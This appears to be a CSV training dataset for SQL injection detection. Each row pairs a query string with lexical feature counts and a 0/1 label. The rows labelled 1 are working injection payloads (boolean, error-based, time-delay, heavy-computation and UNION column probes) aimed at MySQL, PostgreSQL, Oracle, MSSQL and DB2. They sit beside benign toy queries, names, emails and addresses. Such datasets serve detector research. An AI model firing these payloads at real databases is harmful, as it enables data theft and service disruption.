Query,single_comments,logical_operators,arithmetic_operators,drop,union,special_chars,equal,delimiter,dot,whitespaces,digits,alphabets,brackets,nulls,hexadecimal,commas,single_quotes,double_quotes,Label
-7452' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'nmdq' like 'nmdq,0,12,1,0,0,0,2,0,358,160,48,89,32,0,0,0,4,0,1
SELECT applied ( s )  FROM suggest FULL OUTER JOIN,0,0,0,0,0,0,0,0,50,10,0,15,2,0,0,0,0,0,0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0,0,0,0,0,0,0,0,65,13,2,14,0,0,0,0,0,0,0
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ) ,0,0,0,0,0,0,3,0,92,20,0,40,2,0,0,0,6,0,0
"1""  )   as dgzf where 4834  =  4834",0,0,0,0,0,0,1,0,35,12,9,11,1,0,0,0,0,1,1
SELECT COUNT ( forest ) FROM visit,0,0,0,0,0,0,0,0,34,6,0,11,2,0,0,0,0,0,0
1'||  (  select 'eyiy' from dual where 8127  =  8127,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
-1711  )   where 9098  =  9098 order by 1#,0,0,1,0,0,0,1,0,42,13,13,12,1,0,0,0,0,0,1
"iif  (  2976  =  2976,1,1/0  )  ",0,0,0,0,0,0,1,0,32,12,11,3,2,0,0,2,0,0,1
soldani-godet@informex.ru,0,0,1,0,0,1,0,0,25,0,0,22,0,0,0,0,0,0,0
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'maln' like 'maln",0,7,0,0,0,0,1,0,266,106,29,86,24,2,0,4,4,0,1
"c/ bailen 8,",0,0,0,0,0,0,0,0,12,2,1,7,0,0,0,1,0,0,0
SELECT AVG ( six ) FROM join SELECT SUM ( attention ) ,0,0,0,0,0,0,0,0,54,12,0,16,4,0,0,0,0,0,0
DELETE FROM rhyme,0,0,0,0,0,0,0,0,17,2,0,5,0,0,0,0,0,0,0
50,0,0,0,0,0,0,0,0,2,0,2,0,0,0,0,0,0,0,0
jo,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0
madhim,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
bellaguarda,0,0,0,0,0,0,0,0,11,0,0,11,0,0,0,0,0,0,0
"1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,5,2,0,0,0,2,0,229,83,35,75,17,1,0,3,3,0,1
SELECT * FROM origin ORDER BY winter DESC,0,0,0,0,0,0,0,0,41,7,0,12,0,0,0,0,0,0,0
"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",0,3,0,0,0,0,2,0,302,108,43,111,20,0,2,5,4,0,1
zurueta olarte,0,0,0,0,0,0,0,0,14,1,0,13,0,0,0,0,0,0,0
-9690 union all select 7217#,0,0,1,0,1,0,0,0,28,4,8,14,0,0,0,0,0,0,1
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",0,2,0,0,0,2,2,0,172,65,8,75,10,0,0,2,4,0,1
26133,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
SELECT * FROM ordinary WHERE although  BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,56,10,4,16,0,0,0,0,0,0,0
6173,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
SELECT * FROM in WHERE behavior = 'heart' LIMIT 3,0,0,0,0,0,0,1,0,49,9,1,15,0,0,0,0,2,0,0
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'nets' like 'nets",0,6,0,0,0,0,1,0,389,176,35,119,38,2,0,4,4,0,1
SELECT AVG ( myself )  FROM phrase  SELECT SUM ( track ) ,0,0,0,0,0,0,0,0,57,14,0,17,4,0,0,0,0,0,0
SELECT AVG ( either ) FROM usual SELECT SUM ( effect ) ,0,0,0,0,0,0,0,0,55,12,0,17,4,0,0,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0,0,0,0,0,0,1,0,127,11,2,77,0,0,0,0,2,0,0
SELECT TOP 50 PERCENT * FROM eventually,0,0,0,0,0,0,0,0,39,6,2,10,0,0,0,0,0,0,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c83dc379ef' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0,1,0,0,0,4,0,256,46,11,119,4,0,0,2,6,0,0
SELECT Count ( * )  AS column,0,0,0,0,0,0,0,0,29,7,0,10,2,0,0,0,0,0,0
"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",0,1,1,0,0,0,2,0,56,18,20,13,1,0,0,0,0,1,1
" SELECT * FROM close ORDER BY bite ASC, heart DESC",0,0,0,0,0,0,0,0,50,10,0,14,0,0,0,1,0,0,0
SELECT AVG ( lying ) FROM be,0,0,0,0,0,0,0,0,28,6,0,7,2,0,0,0,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",0,3,1,0,0,0,0,0,128,47,10,48,11,0,0,1,1,0,1
"-1917""  )   or 8571  =  8571--",1,1,3,0,0,0,1,0,30,10,12,2,1,0,0,0,0,1,1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1,14,2,0,0,0,2,0,402,178,51,105,38,0,0,0,0,0,1
"""  )  ;waitfor delay '0:0:__TIME__'--",1,0,2,0,0,0,0,1,37,6,2,12,1,0,0,0,2,1,1
46725,0,0,0,0,0,0,0,0,5,0,5,0,0,0,0,0,0,0,0
"  SELECT stop AS given, before AS [knowledge]  FROM train",0,0,0,0,0,0,0,0,57,11,0,29,2,0,0,1,0,0,0
SELECT teeth ( s ) FROM may INNER JOIN,0,0,0,0,0,0,0,0,38,8,0,9,2,0,0,0,0,0,0
SELECT Count ( * )  AS cutting,0,0,0,0,0,0,0,0,30,7,0,11,2,0,0,0,0,0,0
SELECT AVG ( perfectly ) FROM band,0,0,0,0,0,0,0,0,34,6,0,13,2,0,0,0,0,0,0
monopolizador,0,0,0,0,0,0,0,0,13,0,0,13,0,0,0,0,0,0,0
3041,0,0,0,0,0,0,0,0,4,0,4,0,0,0,0,0,0,0,0
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1,0,3,0,1,0,1,0,90,10,48,19,0,0,0,8,1,0,1
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,0,1,0,0,0,0,1,0,108,53,10,33,10,0,0,0,0,0,1
SELECT * FROM explain WHERE NOT this = 'blind'  AND NOT stranger = 'who',0,0,0,0,0,0,2,0,72,14,0,27,0,0,0,0,4,0,0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",0,2,0,0,0,0,2,0,287,120,71,60,22,0,3,6,4,0,1
c/ atlantico 167,0,0,0,0,0,0,0,0,16,2,3,10,0,0,0,0,0,0,0
48825670m,0,0,0,0,0,0,0,0,9,0,8,1,0,0,0,0,0,0,0
"   SELECT hand, cheese+ ', ' + treated+ ' ' + plain+ ', ' + went AS create  FROM test",0,0,6,0,0,0,0,0,85,22,0,36,0,0,0,3,6,0,0
" SELECT column_name ( s )  FROM pleasant,farm",0,0,0,0,0,0,0,0,45,8,0,23,2,0,0,1,0,0,0
tornos,0,0,0,0,0,0,0,0,6,0,0,6,0,0,0,0,0,0,0
victoria,0,0,0,0,0,0,0,0,8,0,0,8,0,0,0,0,0,0,0
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",0,0,1,0,1,0,1,0,98,22,40,25,2,0,0,6,0,0,1
"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",1,1,2,0,1,0,1,0,111,15,9,69,1,10,0,9,3,0,1
SELECT needle ( s )  FROM catch,0,0,0,0,0,0,0,0,31,7,0,12,2,0,0,0,0,0,0
"1""  )   where 5196  =  5196 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,11,2,0,0,0,3,0,355,152,57,86,31,0,0,1,0,1,1
SELECT TOP 3 * FROM say,0,0,0,0,0,0,0,0,23,5,1,3,0,0,0,0,0,0,0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,0,2,0,0,0,0,2,0,95,41,10,31,6,0,0,0,4,0,1
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20,0,0,0,0,0,0,0,0,53,10,4,9,0,0,0,0,0,0,0
2.27852E+15,0,0,1,0,0,0,0,0,11,0,8,0,0,0,0,0,0,0,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0,0,0,0,0,0,0,0,52,9,2,5,0,0,0,0,0,0,0
chuvalo@ppmanzanares.nc,0,0,0,0,0,1,0,0,23,0,0,21,0,0,0,0,0,0,0
"   SELECT Employees.sugar, COUNT ( Orders.secretID )  AS situationFROM    ( OrdersINNER JOIN thrown ON Orders.morningID  =  Employees.butID ) ",0,0,0,0,0,0,1,0,142,26,0,67,4,0,0,1,0,0,0
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,1,2,0,0,0,2,0,161,57,43,42,10,0,3,5,0,0,1
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1,1,2,0,1,2,1,0,75,17,3,35,0,0,0,1,3,0,1
1  )   and   (  3020  =  3020  )  *6703,0,1,0,0,0,0,1,0,39,18,13,3,3,0,0,0,0,0,1
"-1844'  )   union all select 9572,9572,9572,9572#",0,0,1,0,1,0,0,0,49,8,20,14,1,0,0,3,1,0,1
"1"" where 8672  =  8672 union all select null,null#",0,0,0,0,1,0,1,0,50,10,9,27,0,2,0,1,0,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",0,1,0,0,0,0,1,0,101,39,8,40,7,0,0,1,3,0,1
"  SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0,0,0,0,0,3,0,1,54,10,5,6,2,0,0,3,0,4,0
SELECT breathing ( s )  FROM blood UNION,0,0,0,0,0,0,0,0,40,8,0,15,2,0,0,0,0,0,0
1'||  (  select 'avxz' from dual where 7815  =  7815,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
"c/ rua mayor, 31, 1?e",0,0,0,0,0,1,0,0,21,4,3,10,0,0,0,2,0,0,0
""" or sleep  (  __TIME__  )  #",0,1,0,0,0,0,0,0,29,10,0,7,2,0,0,0,0,1,1
us,0,0,0,0,0,0,0,0,2,0,0,2,0,0,0,0,0,0,0
ddimo,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0,0,0,0,0,0,0,1,41,8,12,0,2,0,0,1,0,0,0
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,0,0,0,0,0,0,0,0,55,12,0,17,4,0,0,0,0,0,0
"SELECT * FROM possibly WHERE drop BETWEEN ""earn"" AND    ""pencil""",0,0,0,1,0,0,0,0,64,12,0,22,0,0,0,0,0,4,0
neusy,0,0,0,0,0,0,0,0,5,0,0,5,0,0,0,0,0,0,0
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,2,2,0,0,1,2,0,59,20,4,26,1,0,0,0,0,2,1
SELECT TOP 3 * FROM unknown,0,0,0,0,0,0,0,0,27,5,1,7,0,0,0,0,0,0,0
select   (  case when   (  3681  =  5989  )   then 3681 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0,2,0,0,0,1,0,133,51,14,56,8,0,0,0,0,0,1
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,0,2,0,1,2,1,0,79,23,2,33,2,0,0,1,3,0,1
"1%'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and '%'  =  '",0,4,0,0,0,2,2,0,296,109,34,110,22,1,0,3,4,0,1
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",0,1,0,0,0,0,1,0,47,15,1,24,2,0,0,0,0,3,1
SELECT * FROM had 3,0,0,0,0,0,0,0,0,19,4,1,3,0,0,0,0,0,0,0
6e0turer2,0,0,0,0,0,0,0,0,9,0,3,6,0,0,0,0,0,0,0
SELECT * FROM article WHERE lunch = 'upper',0,0,0,0,0,0,1,0,43,7,0,17,0,0,0,0,2,0,0
lugar grela 152 1?f,0,0,0,0,0,1,0,0,19,3,4,11,0,0,0,0,0,0,0
"1""  )   union all select null,null--",1,0,2,0,1,0,0,0,36,8,1,22,1,2,0,1,0,1,1
-8080'   )    )    order by 1#,0,0,1,0,0,0,0,0,30,13,5,7,2,0,0,0,1,0,1
1'||  (  select 'ydvg' from dual where 7108  =  7108,0,1,0,0,0,0,1,0,52,13,9,23,1,0,0,0,3,0,1
israel_piggot@joyclub.pe,0,0,0,0,0,1,0,0,24,0,0,21,0,0,0,0,0,0,0
sabiela,0,0,0,0,0,0,0,0,7,0,0,7,0,0,0,0,0,0,0
